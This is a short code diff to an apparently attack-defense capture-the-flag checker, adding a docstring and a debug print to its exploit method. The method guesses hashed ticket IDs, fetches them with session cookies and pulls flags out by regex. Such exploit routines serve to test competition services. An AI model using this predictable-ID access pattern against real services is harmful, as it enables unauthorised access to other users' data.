@@ -112,6 +112,10 @@ class BuggyChecker(BaseChecker):
             raise BrokenServiceException("checker failed")
 
     def exploit(self) -> None:
+        """
+            Note that this is only exploiting one flag store,
+            as the service is still Wip.
+        """
         FLAG_RE = r"🏳️‍🌈\\X{4}"
         u = []
         for b in ["mega", "super"]:
@@ -135,6 +139,7 @@ class BuggyChecker(BaseChecker):
                 h = h.hexdigest()
                 r = self.http_get(route=f"/tickets/{h}", cookies=cookies)
                 if "Ticket" in r.text or "buggy-team" in r.text:
+                    print(r.text)  # Use flagbot to strip stdout
                     fl = re.findall(FLAG_RE, r.text)
                     for f in fl:
                         print(f)
